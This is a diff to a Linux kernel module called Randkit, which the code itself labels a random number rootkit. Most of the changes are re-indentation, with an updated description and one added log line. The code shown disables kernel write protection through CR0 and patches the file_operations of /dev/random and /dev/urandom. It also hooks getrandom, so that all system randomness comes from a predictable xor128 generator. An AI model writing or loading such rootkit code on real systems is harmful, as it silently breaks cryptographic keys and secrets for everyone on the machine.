@@ -7,7 +7,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Vincent Rasneur <vrasneur@free.fr>");
-MODULE_DESCRIPTION("Randkit: random number rootkit");
+MODULE_DESCRIPTION("Randkit xor128: replaces /dev/(u)random with a xor128 PRNG");
 
 static struct file_operations *random_fops;
 static struct file_operations *urandom_fops;
@@ -24,25 +24,25 @@ static rk_sys_getrandom_fun saved_sys_getrandom;
 
 static inline unsigned long rk_disable_wp(void)
 {
-  unsigned long cr0;
+    unsigned long cr0;
   
-  preempt_disable();
+    preempt_disable();
 
-  barrier();
-  cr0 = read_cr0();
-  write_cr0(cr0 & ~X86_CR0_WP);
-  barrier();
+    barrier();
+    cr0 = read_cr0();
+    write_cr0(cr0 & ~X86_CR0_WP);
+    barrier();
 
-  return cr0;
+    return cr0;
 }
 
 static inline void rk_enable_wp(unsigned long cr0)
 {
-  barrier();
-  write_cr0(cr0);
-  barrier();
+    barrier();
+    write_cr0(cr0);
+    barrier();
   
-  preempt_enable();
+    preempt_enable();
 }
 
 #define RK_DISABLE_WP				\
@@ -85,32 +85,32 @@ static u32 rk_xor128(void) {
 
 static struct file_operations *rk_get_fops(int minor)
 {
-  struct inode inode;
-  struct file fp;
-  struct address_space mapping;
+    struct inode inode;
+    struct file fp;
+    struct address_space mapping;
   
-  memset(&inode, 0, sizeof(inode));
-  // chrdev_open needs a double link list here
-  INIT_LIST_HEAD(&inode.i_devices);
-  // get a pointer to chrdev_open
-  init_special_inode(&inode, S_IFCHR, MKDEV(1, minor));
+    memset(&inode, 0, sizeof(inode));
+    // chrdev_open needs a double link list here
+    INIT_LIST_HEAD(&inode.i_devices);
+    // get a pointer to chrdev_open
+    init_special_inode(&inode, S_IFCHR, MKDEV(1, minor));
 
-  memset(&fp, 0, sizeof(fp));
-  memset(&mapping, 0, sizeof(mapping));
-  // memdev_open (called by chrdev_open)
-  // needs the f_mapping pointer on old 3.x kernels
-  fp.f_mapping = &mapping;
+    memset(&fp, 0, sizeof(fp));
+    memset(&mapping, 0, sizeof(mapping));
+    // memdev_open (called by chrdev_open)
+    // needs the f_mapping pointer on old 3.x kernels
+    fp.f_mapping = &mapping;
   
-  // inode.i_fop->open == chrdev_open
-  inode.i_fop->open(&inode, &fp);
+    // inode.i_fop->open == chrdev_open
+    inode.i_fop->open(&inode, &fp);
 
-  // for urandom, fp.f_op->read is urandom_read
-  printk(KERN_INFO "read fops is at: %p\n", (void *)fp.f_op->read);
+    // for urandom, fp.f_op->read is urandom_read
+    printk(KERN_INFO "read fops is at: %p\n", (void *)fp.f_op->read);
 
-  list_del(&inode.i_devices);
+    list_del(&inode.i_devices);
   
-  // remove the const correctness
-  return (struct file_operations *)fp.f_op;
+    // remove the const correctness
+    return (struct file_operations *)fp.f_op;
 }
 
 static void const *rk_memmem(void const *haystack, size_t hl,
@@ -181,6 +181,8 @@ static ssize_t rk_fill_buf(char __user *buf, size_t nbytes)
         idx += sizeof(u32);
         count--;
     }
+
+    printk(KERN_INFO "wrote %lu bytes of random data\n", nbytes);
     
     return nbytes;
 }
@@ -249,14 +251,14 @@ static int __init rk_init(void)
 
 static void rk_restore_fops(void)
 {
-  printk(KERN_INFO "restoring random fops\n");
+    printk(KERN_INFO "restoring random fops\n");
 
-  RK_DISABLE_WP
-  *random_fops = saved_random_fops;
-  *urandom_fops = saved_urandom_fops;
-  RK_ENABLE_WP
+    RK_DISABLE_WP
+    *random_fops = saved_random_fops;
+    *urandom_fops = saved_urandom_fops;
+    RK_ENABLE_WP
 
-  printk(KERN_INFO "restoring done\n");
+    printk(KERN_INFO "restoring done\n");
 }
 
 static void rk_restore_getrandom(void)
